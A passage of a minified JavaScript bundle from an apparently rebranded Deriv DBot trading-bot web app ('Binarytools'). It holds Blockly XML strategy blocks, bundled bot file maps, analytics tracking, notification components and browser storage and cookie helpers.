</next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </statement>\n                    <next>\n                      <block type="trade_again" id="dX9#uq8!`~,W]rcu15[e"></block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="before_purchase" id="Gs}:IU2/fgSK=gw}wEzj" collapsed="true" deletable="false" x="0" y="1072">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="controls_if" id="fM#ojplD%p;NNV;fhE.p">\n        <mutation xmlns="http://www.w3.org/1999/xhtml" else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="8jRq=L7/OuLNa5WB;1E%">\n            <field name="OP">EQ</field>\n            <value name="A">\n              <block type="last_digit" id="hxie[fGEwZA(tr2mg/MD"></block>\n            </value>\n            <value name="B">\n              <block type="variables_get" id="9-]sG$;J@mJ31L,)W*$_">\n                <field name="VAR" id="E~[s.X5egS+P$^H_o#nk">Entry Point</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="apollo_notify" id="`{|vIXQ1OcsMpp$$rMX^">\n            <field name="NOTIFICATION_TYPE">success</field>\n            <field name="NOTIFICATION_SOUND">silent</field>\n            <value name="MESSAGE">\n              <shadow type="text" id="?|$aR.VOO2lzK6:DxvGY">\n                <field name="TEXT">Entry Point Confirmed</field>\n              </shadow>\n            </value>\n            <next>\n              <block type="controls_if" id="{JUMUeN0qE_yhh6o;bv`">\n                <mutation xmlns="http://www.w3.org/1999/xhtml" else="1"></mutation>\n                <value name="IF0">\n                  <block type="logic_compare" id="9Krsro|CE%1!_``.zV12">\n                    <field name="OP">EQ</field>\n                    <value name="A">\n                      <block type="variables_get" id=")o9})(W{{X9?{Qm}|_(:">\n                        <field name="VAR" id="HyNhO~!rk1(6_u;tk|_i">Trade Direction</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <block type="math_number" id="w~V@Nr1{v3e)AO4}T+VU">\n                        <field name="NUM">1</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO0">\n                  <block type="apollo_purchase" id="4oUF0V`vAb?3~p;(}guu">\n                    <field name="PURCHASE_LIST">DIGITUNDER</field>\n                  </block>\n                </statement>\n                <statement name="ELSE">\n                  <block type="apollo_purchase" id="ws]_ha)nio4mZUG4NH[d">\n                    <field name="PURCHASE_LIST">DIGITUNDER</field>\n                  </block>\n                </statement>\n              </block>\n            </next>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="apollo_notify" id="L!A8f7+F~t4zhrL9},qi">\n            <field name="NOTIFICATION_TYPE">warn</field>\n            <field name="NOTIFICATION_SOUND">silent</field>\n            <value name="MESSAGE">\n              <shadow type="text" id="f%Iy|%Xg4Hs`|izLhUFZ">\n                <field name="TEXT">Waiting for Entry Point</field>\n              </shadow>\n            </value>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="procedures_defnoreturn" id=":Zu8Y}APEu3!!_[sinI5" collapsed="true" x="0" y="1168">\n    <field name="NAME">Fixed Blocks</field>\n    <comment pinned="false" h="80" w="160">Describe this function...</comment>\n    <statement name="STACK">\n      <block type="variables_set" id="a[z|?7iqhrS/.m(OR8L(" collapsed="true">\n        <field name="VAR" id=":o#E4Mv[vmJES2fN=qo0">Prediction</field>\n        <value name="VALUE">\n          <block type="variables_get" id="G:bSQLMo@(lMc^5Z(#QV">\n            <field name="VAR" id="K`h}~iKgn?Z)RHYaKFfT">Under Prediction</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="6Q](V?T%PKX8Rij[$j!S" collapsed="true">\n            <field name="VAR" id="HyNhO~!rk1(6_u;tk|_i">Trade Direction</field>\n            <value name="VALUE">\n              <block type="math_number" id="3oMHex_SyQHn=!2(5ozL">\n                <field name="NUM">1</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="5su3#UL@)eb6lLGuQDEP" collapsed="true">\n                <field name="VAR" id="V3`ByiTyoj~_e_hJc;X=">Stake1</field>\n                <value name="VALUE">\n                  <block type="variables_get" id="zO+?wNO1(kSYgHW6u62U">\n                    <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2">Stake</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="de[MYEa/$F7nK7DB*5x/" collapsed="true">\n                    <field name="VAR" id="uIhzq(Rnu7?ay*)Lax`q">Loss</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="?.AIBhG2,XPpW||t2]QG">\n                        <field name="NUM">0</field>\n                      </block>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n  <block type="tick_analysis" id="kcP)]7|ha;j{TTSbVu_q" collapsed="true" x="0" y="1264">\n    <statement name="TICKANALYSIS_STACK">\n      <block type="text_join" id="lK#m0:~I?^*ET4~U-^v4">\n        <field name="VARIABLE" id="]_MS:$MrQakFy~dy[v}a">Text2</field>\n        <statement name="STACK">\n          <block type="text_statement" id=",%LK=aSt#y[dpMeH7_fJ">\n            <value name="TEXT">\n              <shadow type="text" id="zc9qM1u!z@xjtH5i]Um!">\n                <field name="TEXT">Entry Point: </field>\n              </shadow>\n            </value>\n            <next>\n              <block type="text_statement" id="Kf[v8Q=h!6jzRCl*`_D*">\n                <value name="TEXT">\n                  <shadow type="text" id="~TTkS+#|gN(C^^gJ,5tW">\n                    <field name="TEXT">| </field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="text_statement" id="Ok-6pXSB|w/lj}5A[TqZ">\n                    <value name="TEXT">\n                      <shadow type="text" id="5FYCb,@)eB:7[c@k-L5G">\n                        <field name="TEXT"></field>\n                      </shadow>\n                      <block type="variables_get" id="_l]Pf/$Z/Rj8yv7bd`_f">\n                        <field name="VAR" id="E~[s.X5egS+P$^H_o#nk">Entry Point</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="text_statement" id="BUD69!n4IMhZFETl!/dF">\n                        <value name="TEXT">\n                          <shadow type="text" id="20eTXlY-3D@rOZ0udwi|">\n                            <field name="TEXT">   ||  </field>\n                          </shadow>\n                        </value>\n                        <next>\n                          <block type="text_statement" id="gE(MpQ?Zr-RHEVi|N8^!">\n                            <value name="TEXT">\n                              <shadow type="text" id="PfF^=5bTN0J=|Nr,,Oo#">\n                                <field name="TEXT">Last Digit: </field>\n                              </shadow>\n                            </value>\n                            <next>\n                              <block type="text_statement" id="_m6im(7eYaPsP3C9Ug~9">\n                                <value name="TEXT">\n                                  <shadow type="text" id="29qy_Db7VjIhv=Dg`,oH">\n                                    <field name="TEXT"></field>\n                                  </shadow>\n                                  <block type="last_digit" id="rVw!_j(A[UkD{06U)Re/"></block>\n                                </value>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </statement>\n        <next>\n          <block type="notify" id="+:}+F{Z`iV22gmMrj0=g">\n            <field name="NOTIFICATION_TYPE">info</field>\n            <field name="NOTIFICATION_SOUND">silent</field>\n            <value name="MESSAGE">\n              <shadow type="text" id="toC,njQb:m/Dut4YBj`h">\n                <field name="TEXT">abc</field>\n              </shadow>\n              <block type="variables_get" id="jr#Lwn-Omd^3%Ag0c04[">\n                <field name="VAR" id="]_MS:$MrQakFy~dy[v}a">Text2</field>\n              </block>\n            </value>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n</xml>'
            },
            1601: function(e, t, n) {
                var a = {
                    "./Barriers Accumulator Master.xml": "38218",
                    "./DeepSeek Auto Pro.xml": "98141",
                    "./ExpertEdge V1.xml": "67636",
                    "./Marvel SPLIT ORIGINAL.xml": "12472",
                    "./Marvel_PRO_Fully_Auto_V_2_0_Original.xml": "49621",
                    "./Over 1 Recovery Over 4.xml": "68507",
                    "./Over Under Pro Bot.xml": "51551",
                    "./WEALTH GENERATOR V2.xml": "35630"
                };

                function i(e) {
                    return n(l(e))
                }

                function l(e) {
                    if (!n.o(a, e)) {
                        var t = Error("Cannot find module '" + e + "'");
                        throw t.code = "MODULE_NOT_FOUND", t
                    }
                    return a[e]
                }
                i.keys = function() {
                    return Object.keys(a)
                }, i.resolve = l, e.exports = i, i.id = "1601"
            },
            59719: function(e, t, n) {
                var a = {
                    "./Comrades Saviour.xml": "60379",
                    "./Market Switcher Robot by Binarytool.site.xml": "65765",
                    "./Mkorean SV5 2024.xml": "99194",
                    "./Mkorean SV7 2025.xml": "40696",
                    "./Sniper Under 7.xml": "13360"
                };

                function i(e) {
                    return n(l(e))
                }

                function l(e) {
                    if (!n.o(a, e)) {
                        var t = Error("Cannot find module '" + e + "'");
                        throw t.code = "MODULE_NOT_FOUND", t
                    }
                    return a[e]
                }
                i.keys = function() {
                    return Object.keys(a)
                }, i.resolve = l, e.exports = i, i.id = "59719"
            },
            35119: function(e, t, n) {
                var a = {
                    "./Entry Point Scanner.xml": "41841",
                    "./Expert Speed Bot By CHOSEN DOLLAR PRINTER FX\uD83D\uDCC9\uD83D\uDCC9\uD83D\uDCC9\uD83D\uDCC8\uD83D\uDCC8\uD83D\uDCC8 (2).xml": "76485",
                    "./Over 3 Signal Bot.xml": "93801",
                    "./Super Speed Bot.xml": "6422",
                    "./Under 6 Signal.xml": "3082"
                };

                function i(e) {
                    return n(l(e))
                }

                function l(e) {
                    if (!n.o(a, e)) {
                        var t = Error("Cannot find module '" + e + "'");
                        throw t.code = "MODULE_NOT_FOUND", t
                    }
                    return a[e]
                }
                i.keys = function() {
                    return Object.keys(a)
                }, i.resolve = l, e.exports = i, i.id = "35119"
            },
            5765: function(e, t, n) {
                var a = {
                    "./reverse_martingale.xml": ["19538", "822"],
                    "./accumulators_martingale_on_stat_reset.xml": ["70542", "329"],
                    "./accumulators_reverse_martingale.xml": ["16319", "777"],
                    "./accumulators_reverse_martingale_on_stat_reset.xml": ["29916", "881"],
                    "./dalembert.xml": ["99483", "451"],
                    "./dalembert_max-stake.xml": ["7798", "600"],
                    "./martingale_max-stake.xml": ["90579", "723"],
                    "./accumulators_dalembert.xml": ["50790", "980"],
                    "./1_3_2_6.xml": ["32079", "281"],
                    "./accumulators_martingale.xml": ["44763", "917"],
                    "./martingale.xml": ["42625", "59"],
                    "./accumulators_dalembert_on_stat_reset.xml": ["1307", "110"],
                    "./oscars_grind.xml": ["85326", "642"],
                    "./reverse_dalembert.xml": ["4042", "809"],
                    "./accumulators_reverse_dalembert.xml": ["17017", "730"],
                    "./accumulators_reverse_dalembert_on_stat_reset.xml": ["50278", "535"],
                    "./oscars_grind_max-stake.xml": ["97290", "369"]
                };

                function i(e) {
                    if (!n.o(a, e)) return Promise.resolve().then(function() {
                        var t = Error("Cannot find module '" + e + "'");
                        throw t.code = "MODULE_NOT_FOUND", t
                    });
                    var t = a[e],
                        i = t[0];
                    return n.e(t[1]).then(function() {
                        return n(i)
                    })
                }
                i.keys = () => Object.keys(a), i.id = "5765", e.exports = i
            },
            13617: function(e, t, n) {
                "use strict";
                n.d(t, {
                    oH: function() {
                        return a
                    },
                    om: function() {
                        return o
                    },
                    xt: function() {
                        return i
                    }
                });
                let a = "ce_bot_form",
                    i = "No results found";
                var l, o = ((l = {}).OPEN = "open", l.CLOSE = "close", l.RUN_BOT = "run_bot", l.RUN_QUICK_STRATEGY = "run_quick_strategy", l.EDIT_QUICK_STRATEGY = "edit_quick_strategy", l.SELECT_QUICK_STRATEGY_GUIDE = "select_quick_strategy_guide", l.SWITCH_QUICK_STRATEGY_TAB = "switch_quick_strategy_tab", l.DASHBOARD_CLICK = "dashboard_click", l.UPLOAD_STRATEGY_START = "upload_strategy_start", l.UPLOAD_STRATEGY_COMPLETED = "upload_strategy_completed", l.UPLOAD_STRATEGY_FAILED = "upload_strategy_failed", l.GOOGLE_DRIVE_CONNECT = "google_drive_connect", l.GOOGLE_DRIVE_DISCONNECT = "google_drive_disconnect", l.SWITCH_LOAD_STRATEGY_TAB = "switch_load_strategy_tab", l.ANNOUNCEMENT_CLICK = "announcement_click", l.ANNOUNCEMENT_ACTION = "announcement_action", l)
            },
            89057: function(e, t, n) {
                "use strict";
                n.d(t, {
                    GE: function() {
                        return r
                    },
                    Oi: function() {
                        return d
                    },
                    WN: function() {
                        return c
                    },
                    _W: function() {
                        return s
                    },
                    df: function() {
                        return m
                    },
                    m5: function() {
                        return o
                    },
                    mu: function() {
                        return u
                    },
                    z9: function() {
                        return b
                    }
                });
                var a = n(83571),
                    i = n(13617),
                    l = n(66062);
                let o = e => {
                        let {
                            subpage_name: t,
                            subform_source: n,
                            subform_name: l,
                            load_strategy_tab: o
                        } = e;
                        a.Analytics.trackEvent("ce_bot_form", {
                            action: i.om.OPEN,
                            form_name: i.oH,
                            subpage_name: t,
                            subform_name: l,
                            subform_source: n,
                            load_strategy_tab: o
                        })
                    },
                    s = e => {
                        let {
                            subform_name: t,
                            quick_strategy_tab: n,
                            selected_strategy: o,
                            load_strategy_tab: s,
                            announcement_name: r
                        } = e;
                        a.Analytics.trackEvent("ce_bot_form", {
                            action: i.om.CLOSE,
                            form_name: i.oH,
                            subform_name: t,
                            quick_strategy_tab: n,
                            strategy_name: (0, l.gc)(o),
                            load_strategy_tab: s,
                            announcement_name: r
                        })
                    },
                    r = e => {
                        let {
                            subpage_name: t
                        } = e;
                        a.Analytics.trackEvent("ce_bot_form", {
                            action: i.om.RUN_BOT,
                            form_name: i.oH,
                            subpage_name: t
                        })
                    },
                    d = e => {
                        let {
                            upload_provider: t,
                            upload_id: n
                        } = e;
                        a.Analytics.trackEvent("ce_bot_form", {
                            action: i.om.UPLOAD_STRATEGY_START,
                            form_name: i.oH,
                            subform_name: "load_strategy",
                            subpage_name: "bot_builder",
                            upload_provider: t,
                            upload_id: n
                        })
                    },
                    c = e => {
                        let {
                            upload_provider: t,
                            upload_id: n,
                            upload_type: l
                        } = e;
                        a.Analytics.trackEvent("ce_bot_form", {
                            action: i.om.UPLOAD_STRATEGY_COMPLETED,
                            form_name: i.oH,
                            subform_name: "load_strategy",
                            subpage_name: "bot_builder",
                            upload_provider: t,
                            upload_id: n,
                            upload_type: l
                        })
                    },
                    u = e => {
                        let {
                            upload_provider: t,
                            upload_id: n,
                            upload_type: l,
                            error_message: o,
                            error_code: s
                        } = e;
                        a.Analytics.trackEvent("ce_bot_form", {
                            action: i.om.UPLOAD_STRATEGY_FAILED,
                            form_name: i.oH,
                            subform_name: "load_strategy",
                            subpage_name: "bot_builder",
                            upload_provider: t,
                            upload_id: n,
                            upload_type: l,
                            error_message: o,
                            error_code: s
                        })
                    },
                    m = () => {
                        a.Analytics.trackEvent("ce_bot_form", {
                            action: i.om.GOOGLE_DRIVE_CONNECT,
                            form_name: i.oH,
                            subpage_name: "bot_builder"
                        })
                    },
                    b = () => {
                        a.Analytics.trackEvent("ce_bot_form", {
                            action: i.om.GOOGLE_DRIVE_DISCONNECT,
                            form_name: i.oH,
                            subpage_name: "bot_builder"
                        })
                    }
            },
            66062: function(e, t, n) {
                "use strict";
                n.d(t, {
                    dC: function() {
                        return m
                    },
                    gc: function() {
                        return r
                    },
                    qc: function() {
                        return u
                    },
                    yO: function() {
                        return c
                    }
                });
                var a, i = n(85414),
                    l = n(13617);
                let o = () => {
                        try {
                            var e;
                            return JSON.parse((null === (e = localStorage) || void 0 === e ? void 0 : e.getItem("qs-analytics")) ? ? "{}")
                        } catch (e) {
                            return console.error("Rudderstack: unable to get dropdown text"), {}
                        }
                    },
                    s = e => e && e !== l.xt,
                    r = e => {
                        var t;
                        return null === (t = (0, i.j)()[e]) || void 0 === t ? void 0 : t.rs_strategy_name
                    };
                var d = ((a = d || {}).recent = "recent", a.local = "local", a.google_drive = "google drive", a);
                let c = Object.values(d),
                    u = e => {
                        let {
                            form_values: t
                        } = e;
                        if (!t) return;
                        let {
                            symbol: n,
                            tradetype: a,
                            type: i,
                            stake: l
                        } = t, r = o();
                        return {
                            asset_type: s(null == r ? void 0 : r.symbol) ? r.symbol : n,
                            trade_type: s(null == r ? void 0 : r.tradetype) ? null == r ? void 0 : r.tradetype : a,
                            purchase_condition: s(null == r ? void 0 : r.type) ? null == r ? void 0 : r.type : i,
                            initial_stake: s(null == r ? void 0 : r.stake) ? null == r ? void 0 : r.stake : l
                        }
                    },
                    m = e => {
                        try {
                            let t = new DOMParser().parseFromString(e.toString(), "application/xml");
                            if (t.getElementsByTagName("xml").length) {
                                let e = t.documentElement.getAttribute("is_dbot");
                                return "true" === e ? "new" : "old"
                            }
                            return "old"
                        } catch (e) {
                            return "old"
                        }
                    }
            },
            59462: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Bn: function() {
                        return d
                    },
                    tx: function() {
                        return s
                    },
                    xG: function() {
                        return r
                    }
                });
                var a, i = n(6753),
                    l = n(26855),
                    o = n(48059);
                var s = ((a = {}).BOT_IMPORT = "BOT_IMPORT", a.BOT_DELETE = "BOT_DELETE", a);
                let r = () => ({
                        bot_stop: (0, o.NC)("You’ve just stopped the bot. Any open contracts can be viewed on the Reports page."),
                        workspace_change: (0, o.NC)("Changes you make will not affect your running bot."),
                        block_delete: (0, o.NC)("You’ve just deleted a block."),
                        invalid_xml: (0, o.NC)("Your import failed due to an invalid file. Try uploading on OLD Binarytool."),
                        BOT_IMPORT: (0, o.NC)("You’ve successfully imported a bot."),
                        BOT_DELETE: (0, o.NC)("You’ve successfully deleted a bot."),
                        strategy_conversion: (0, o.NC)("Save this strategy as an XML file from D-Bot for faster re-imports."),
                        google_drive_error: (0, o.NC)("Your session has expired. Please sign in again.")
                    }),
                    d = {
                        type: i.Am.TYPE.DEFAULT,
                        position: (0, l.rK)() ? i.Am.POSITION.BOTTOM_RIGHT : i.Am.POSITION.BOTTOM_LEFT,
                        autoClose: 6e3,
                        hideProgressBar: !0,
                        closeOnClick: !1,
                        pauseOnHover: !0,
                        pauseOnFocusLoss: !1
                    }
            },
            64736: function(e, t, n) {
                "use strict";
                n.d(t, {
                    J: function() {
                        return r
                    }
                });
                var a = n(85893),
                    i = n(67294),
                    l = n(6753),
                    o = n(59462);
                let s = e => {
                        let {
                            message: t,
                            primary_action: n,
                            closeToast: o
                        } = e;
                        return i.useEffect(() => {
                            let e = () => {
                                "hidden" === document.visibilityState && l.Am.dismiss()
                            };
                            return document.addEventListener("visibilitychange", e), () => {
                                document.removeEventListener("visibilitychange", e)
                            }
                        }, []), (0, a.jsxs)("div", {
                            className: "notification-content",
                            "data-testid": "dt_bot_notification",
                            children: [(0, a.jsx)("div", {
                                children: t
                            }), n && (0, a.jsx)("button", {
                                onClick: () => n.onClick(o),
                                children: n.label
                            })]
                        })
                    },
                    r = (e, t, n) => (0, l.Am)(n => {
                        let {
                            closeToast: i
                        } = n;
                        return (0, a.jsx)(s, {
                            message: e,
                            primary_action: t,
                            closeToast: i
                        })
                    }, {
                        type: (null == n ? void 0 : n.type) ? ? o.Bn.type,
                        position: (null == n ? void 0 : n.position) ? ? o.Bn.position,
                        autoClose: (null == n ? void 0 : n.autoClose) ? ? o.Bn.autoClose,
                        hideProgressBar: (null == n ? void 0 : n.hideProgressBar) ? ? o.Bn.hideProgressBar,
                        closeOnClick: (null == n ? void 0 : n.closeOnClick) ? ? o.Bn.closeOnClick,
                        pauseOnHover: (null == n ? void 0 : n.pauseOnHover) ? ? o.Bn.pauseOnHover,
                        pauseOnFocusLoss: (null == n ? void 0 : n.pauseOnFocusLoss) ? ? o.Bn.pauseOnFocusLoss,
                        closeButton: (null == n ? void 0 : n.closeButton) ? ? !0
                    })
            },
            17481: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Gz: function() {
                        return i
                    },
                    Lq: function() {
                        return a
                    }
                }), n(88199);
                let a = () => ({
                        au: "Australian",
                        sg: "Singaporean",
                        it: "Italian",
                        de: "German",
                        fr: "French",
                        lu: "Luxembourgish",
                        gr: "Greek",
                        mf: "Saint Martiner",
                        es: "Spanish",
                        sk: "Slovak",
                        lt: "Lithuanian",
                        nl: "Dutch",
                        at: "Austrian",
                        bg: "Bulgarian",
                        si: "Slovenian",
                        cy: "Cypriot",
                        be: "Belgian",
                        ro: "Romanian",
                        hr: "Croatian",
                        pt: "Portuguese",
                        pl: "Polish",
                        lv: "Latvian",
                        ee: "Estonian",
                        cz: "Czech",
                        fi: "Finnish",
                        hu: "Hungarian",
                        dk: "Danish",
                        se: "Swedish",
                        ie: "Irish",
                        im: "Manx",
                        gb: "British",
                        mt: "Malta"
                    }),
                    i = () => ["za", "ec", "bw"]
            },
            83543: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Z: () => o
                });
                var a = n("85893"),
                    i = n("31302");
                n("12199");
                let l = i.Z;

                function o(e) {
                    let {
                        message: t
                    } = e;
                    return (0, a.jsxs)("div", {
                        className: "app-root",
                        children: [(0, a.jsx)(l, {
                            is_fullscreen: !1
                        }), (0, a.jsx)("div", {
                            className: "load-message",
                            children: t
                        })]
                    })
                }
            },
            29656: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Yb: function() {
                        return r
                    },
                    uw: function() {
                        return o
                    },
                    x3: function() {
                        return i
                    }
                });
                let a = ["it", "de", "fr", "lu", "gr", "mf", "es", "sk", "lt", "nl", "at", "bg", "si", "cy", "be", "ro", "hr", "pt", "pl", "lv", "ee", "cz", "fi", "hu", "dk", "se", "ie", "im", "gb", "mt"],
                    i = e => a.includes(e),
                    l = ["de", "es", "it", "lu", "gr", "au", "fr"],
                    o = e => l.includes(e),
                    s = ["au", "fr"],
                    r = e => s.includes(e)
            },
            66175: function(e, t, n) {
                "use strict";
                let a;
                n.d(t, {
                    hWv: () => f,
                    s0r: () => U.s0,
                    JIr: () => c.JI,
                    CY$: () => U.CY,
                    vxy: () => c.vx,
                    gNN: () => c.gN,
                    lby: () => u.lb,
                    mrB: () => m.mr,
                    O2o: () => r.O2,
                    cX8: () => z,
                    oC5: () => u.oC,
                    K9$: () => c.K9,
                    kIu: () => P.kI,
                    FTx: () => c.FT,
                    DQA: () => d.DQ,
                    j73: () => C,
                    fcq: () => m.fc,
                    LI1: () => P.LI,
                    p6d: () => m.p6,
                    LUK: () => m.LU,
                    rhL: () => r.rh,
                    CeH: () => c.Ce,
                    gk9: () => d.gk,
                    W9k: () => c.W9,
                    O$T: () => u.O$,
                    v3q: () => c.v3,
                    i4S: () => u.i4,
                    e_e: () => r.e_,
                    QRc: () => m.QR,
                    efd: () => c.ef,
                    drH: () => u.dr,
                    dR9: () => c.dR,
                    tmR: () => M,
                    hwq: () => B,
                    Kq_: () => c.Kq,
                    Lp7: () => c.Lp,
                    $Xq: () => o,
                    bfN: () => u.bf,
                    wmM: () => r.wm,
                    tqC: () => G.tq,
                    L8o: () => c.L8,
                    FJ7: () => c.FJ,
                    yvY: () => r.yv,
                    G6W: () => s,
                    xGd: () => c.xG,
                    MOe: () => c.MO,
                    Dlf: () => c.Dl,
                    dq6: () => c.dq,
                    vMw: () => c.vM,
                    MT8: () => O.MT,
                    _mr: () => c._m,
                    XtD: () => c.Xt,
                    oS6: () => u.oS,
                    xb4: () => P.xb,
                    nIE: () => G.nI,
                    Qr$: () => P.Qr,
                    UTW: () => c.UT,
                    uvr: () => P.uv,
                    iBr: () => c.iB,
                    Yeo: () => c.Ye,
                    _Xx: () => F,
                    eiS: () => P.ei,
                    vPG: () => P.vP,
                    xVn: () => p,
                    xOw: () => j.x,
                    gbT: () => m.gb
                }), n("83571");
                var i = JSON.parse('{"Zk":{"trader":{"name":"Deriv Trader","icon":"IcRebrandingDerivTrader"},"dbot":{"name":"Binarytools","icon":"IcRebrandingDerivBot"},"mt5":{"name":"Deriv MT5","icon":"IcRebrandingDmt5"},"ctrader":{"name":"Deriv cTrader","icon":"IcRebrandingCtrader"},"dxtrade":{"name":"Deriv X","icon":"IcRebrandingDxtrade"},"smarttrader":{"name":"SmartTrader","icon":"IcRebrandingSmarttrader"},"bbot":{"name":"Binary Bot","icon":"IcRebrandingBinaryBot"},"go":{"name":"Deriv GO","icon":"IcRebrandingDerivGo"}}}');
                let l = e => /^(((.*)\.)?(localhost:8444|pages.dev|binary\.(sx|com)|deriv.(com|me|be|dev)))$/.test(e),
                    o = e => {
                        let t = i.Zk[e];
                        return !l(window.location.host) && (t.icon = ""), t
                    },
                    s = () => /constructor/i.test(window.HTMLElement) || "[object SafariRemoteNotification]" === (!window.safari || void 0 !== window.safari && window.safari.pushNotification).toString();
                var r = n("18470"),
                    d = n("63069"),
                    c = n("91761"),
                    u = n("52717"),
                    m = n("72755"),
                    b = n("29656");
                let p = function(e, t, n, a) {
                        let i = !(arguments.length > 4) || void 0 === arguments[4] || arguments[4],
                            {
                                title: l,
                                text: o,
                                link: s
                            } = t;
                        e({
                            message: o,
                            header: l,
                            redirect_label: s,
                            redirectOnClick: n,
                            should_show_refresh: !1,
                            redirect_to: "/appstore/traders-hub",
                            should_clear_error_on_click: i,
                            should_redirect: a
                        })
                    },
                    f = e => (null == e ? void 0 : e.length) === 1 && e.every(e => (0, b.x3)(e.residence ? ? "") && "virtual" === e.landing_company_shortcode);
                n("23554"), Object.freeze({
                    amlglobalcheck: "amlglobalcheck",
                    bankstatement: "bankstatement",
                    docverification: "docverification",
                    driverslicense: "driverslicense",
                    driving_licence: "driving_licence",
                    national_identity_card: "national_identity_card",
                    other: "other",
                    passport: "passport",
                    power_of_attorney: "power_of_attorney",
                    proof_of_ownership: "proof_of_ownership",
                    proofaddress: "proofaddress",
                    proofid: "proofid",
                    utility_bill: "utility_bill"
                }), Object.freeze({
                    back: "back",
                    front: "front",
                    photo: "photo"
                });
                var _ = n("68949"),
                    h = n("48059"),
                    v = n("33304"),
                    y = n("92198"),
                    k = n("45543"),
                    g = n("24797");
                let T = function(e) {
                        return JSON.parse(this.getItem(e) || "{}")
                    },
                    E = function(e, t) {
                        if (t && t instanceof Object) try {
                            this.setItem(e, JSON.stringify(t))
                        } catch (e) {}
                    };
                "undefined" != typeof Storage && (Storage.prototype.getObject = T, Storage.prototype.setObject = E);
                let A = e => {
                        if (void 0 === e) return !1;
                        let t = "test";
                        try {
                            return e.setItem(t, "1"), e.removeItem(t), !0
                        } catch (e) {
                            return !1
                        }
                    },
                    x = function(e) {
                        this.storage = e, this.storage.getObject = T, this.storage.setObject = E
                    };
                x.prototype = {
                    get(e) {
                        return this.storage.getItem(e) || void 0
                    },
                    set(e, t) {
                        void 0 !== t && this.storage.setItem(e, t)
                    },
                    getObject(e) {
                        return "function" == typeof this.storage.getObject ? this.storage.getObject(e) : JSON.parse(this.storage.getItem(e) || "{}")
                    },
                    setObject(e, t) {
                        "function" == typeof this.storage.setObject ? this.storage.setObject(e, t) : this.storage.setItem(e, JSON.stringify(t))
                    },
                    remove(e) {
                        this.storage.removeItem(e)
                    },
                    clear() {
                        this.storage.clear()
                    }
                };
                let w = function(e) {
                    this.store = void 0 !== e ? e : {}
                };
                w.prototype = {
                    get(e) {
                        return (0, k.SX)(this.store, e)
                    },
                    set(e, t) {
                        let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.store,
                            a = e;
                        !Array.isArray(a) && (a = [a]), a.length > 1 ? ((!(a[0] in n) || (0, k.Qr)(n[a[0]])) && (n[a[0]] = {}), this.set(a.slice(1), t, n[a[0]])) : n[a[0]] = t
                    },
                    getObject(e) {
                        return JSON.parse(this.get(e) || "{}")
                    },
                    setObject(e, t) {
                        this.set(e, JSON.stringify(t))
                    },
                    remove() {
                        for (var e = arguments.length, t = Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                        t.forEach(e => {
                            delete this.store[e]
                        })
                    },
                    clear() {
                        this.store = {}
                    },
                    has(e) {
                        return void 0 !== this.get(e)
                    },
                    keys() {
                        return Object.keys(this.store)
                    },
                    call(e) {
                        "function" == typeof this.get(e) && this.get(e)()
                    }
                };
                let N = new w;
                N.prototype = w.prototype, N.prototype.getResponse = function(e) {
                    let t = e;
                    if ("string" == typeof t) {
                        let e = t.split(".");
                        t = ["response", e[0]].concat(e)
                    }
                    return this.get(t)
                }, N.prototype.getByMsgType = N.getResponse, N.set("response", {});
                let S = function(e, t) {
                    let n = window.location.hostname;
                    this.initialized = !1, this.cookie_name = e, this.domain = t || (n.includes("binary.sx") ? "binary.sx" : g.L.DERIV_HOST_NAME), this.path = "/", this.expires = new Date("Thu, 1 Jan 2037 12:00:00 GMT"), this.value = {}
                };
                S.prototype = {
                    read() {
                        let e = y.Z.get(this.cookie_name);
                        try {
                            this.value = e ? JSON.parse(e) : {}
                        } catch (e) {
                            this.value = {}
                        }
                        this.initialized = !0
                    },
                    write(e, t, n) {
                        !this.initialized && this.read(), this.value = e, t && (this.expires = t), y.Z.set(this.cookie_name, this.value, {
                            expires: this.expires,
                            path: this.path,
                            domain: this.domain,
                            secure: !!n
                        })
                    },
                    get(e) {
                        return !this.initialized && this.read(), this.value[e]
                    },
                    set(e, t) {
                        !this.initialized && this.read(), this.value[e] = t, y.Z.set(this.cookie_name, this.value, {
                            expires: new Date(this.expires),
                            path: this.path,
                            domain: this.domain
                        })
                    },
                    remove() {
                        y.Z.remove(this.cookie_name, {
                            path: this.path,
                            domain: this.domain
                        })
                    }
                };
                let C = A(window.localStorage) ? new x(window.localStorage) : new w;
                A(window.sessionStorage) ? new x(window.sessionStorage) : new w;
                var O = n("339");
                let L = function(e, t) {
                        let n = !(arguments.length > 2) || void 0 === arguments[2] || arguments[2],
                            a = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : 0;
                        if (!e && A(sessionStorage)) {
                            let e = window.location,
                                i = n ? window.location.href : `${e.protocol}//${e.host}${e.pathname}`;
                            sessionStorage.setItem("redirect_url", i), setTimeout(() => {
                                let e = R({
                                    language: t
                                });
                                window.location.href = e
                            }, a)
                        }
